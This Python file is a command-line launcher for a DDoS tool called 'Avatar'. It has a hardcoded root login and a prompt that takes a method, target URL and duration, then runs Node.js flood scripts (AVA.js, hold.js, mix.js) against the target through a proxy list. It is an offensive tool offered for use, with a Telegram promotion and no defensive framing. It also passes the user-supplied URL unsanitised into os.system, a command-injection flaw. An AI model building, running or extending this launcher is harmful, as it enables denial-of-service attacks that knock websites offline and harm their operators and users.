# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

# Define the base path for files
BASE_PATH = os.path.join(os.path.expanduser('~'), 'Downloads', 'avatarddos')
FILE_PATH = os.path.join(BASE_PATH, 'File')

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def help():
    clear_screen()
    print("""
                           ▄▀█ █░█ ▄▀█ ▀█▀ ▄▀█ █▀█
                           █▀█ ▀▄▀ █▀█ ░█░ █▀█ █▀▄
                              Welcome To Avatar
                TYPE THE \x1b[38;5;166m[\033[32mMETHODS\x1b[38;5;166m] \x1b[38;5;166m[\033[32mURL\x1b[38;5;166m] \x1b[38;5;166m[\033[32mTIME\x1b[38;5;166m]\x1b[38;5;22m To Start Attack
                             \x1b[38;5;166mStay To ↓ For Update
                              t.me/avatara4ng
                         \x1b[38;5;46m• \x1b[38;5;46mAVA \x1b[38;5;46m[\x1b[38;5;46mL7]    • FLOOD  \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m] 
                         • TLS   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]    • HOLD   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]
                         •   -   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]    •   -    \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]
                         •   -   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]    •   -    \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]
\033[0m""")

def main():
    clear_screen()
    print("""
                           ▄▀█ █░█ ▄▀█ ▀█▀ ▄▀█ █▀█
                           █▀█ ▀▄▀ █▀█ ░█░ █▀█ █▀▄
                              Welcome To Avatar
		   	 Type \x1b[38;5;166m[\033[32mhelp\x1b[38;5;166m] To See Use
                             t.me/avatara4ng⠀⠀
\033[0m""")

    while True:
        sys.stdout.write(f"\x1b]2;[\] AstroDDoS :: Online Users: [1]")
        sin = input("\033[0;38;46mAVATAR\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m").strip()
        if not sin:
            continue
            
        sinput = sin.split(" ")[0].upper()
        
        if sinput == "CLEAR" or sinput == "CLS":
            clear_screen()
            main()
        elif sinput == "HELP" or sinput == "MENU":
            help()
        elif sinput in ["AVA", "TLS", "FLOOD", "HOLD"]:
            try:
                parts = sin.split()
                if len(parts) < 3:
                    print("\x1b[31mError: Missing arguments. Format: [METHOD] [URL] [TIME]\033[0m")
                    continue
                    
                url = parts[1]
                time = parts[2]
                
                # Validate URL
                if not url.startswith(('http://', 'https://')):
                    print("\x1b[31mError: URL must start with http:// or https://\033[0m")
                    continue
                    
                # Validate time is numeric
                if not time.isdigit():
                    print("\x1b[31mError: Time must be a number\033[0m")
                    continue
                
                # Execute the appropriate attack
                if sinput == "AVA":
                    os.system(f'cd /d "{FILE_PATH}" && node AVA.js {url} {time} 10 10 proxy.txt')
                elif sinput == "TLS":
                    os.system(f'cd /d "{FILE_PATH}" && node hold.js {url} {time} 10 10 proxy.txt')
                elif sinput == "FLOOD":
                    os.system(f'cd /d "{FILE_PATH}" && node AVA.js {url} {time} 10 9 proxy.txt')
                elif sinput == "HOLD":
                    os.system(f'cd /d "{FILE_PATH}" && node mix.js {url} {time} 10 10 proxy.txt')
                    print("\x1b[38;5;46mAttack Sent")
                
                clear_screen()
            except Exception as e:
                print(f"\x1b[31mError: {str(e)}\033[0m")
                continue

def login():
    sys.stdout.write(f"\x1b]2;[\] Avatar :: Online Users: [1] :: Attack Sended: [1/10]\x07")
    clear_screen()
    user = "root"
    passwd = "3"
    username = input("""
                           ▄▀█ █░█ ▄▀█ ▀█▀ ▄▀█ █▀█
                           █▀█ ▀▄▀ █▀█ ░█░ █▀█ █▀▄
                              Welcome To Avatar
						   
\x1b[38;5;166m[\033[32mUSERNAME\x1b[38;5;166m]:\033[0m """)
    password = getpass.getpass(prompt='\x1b[38;5;166m[\033[32mPASSWORD\x1b[38;5;166m]:\033[0m ')
    if username != user or password != passwd:
        print("")
        sys.exit(1)
    elif username == user and password == passwd:
        print("\x1b[38;5;46mSuccessfully Login")
        time.sleep(1)
        main()

if __name__ == "__main__":
    login()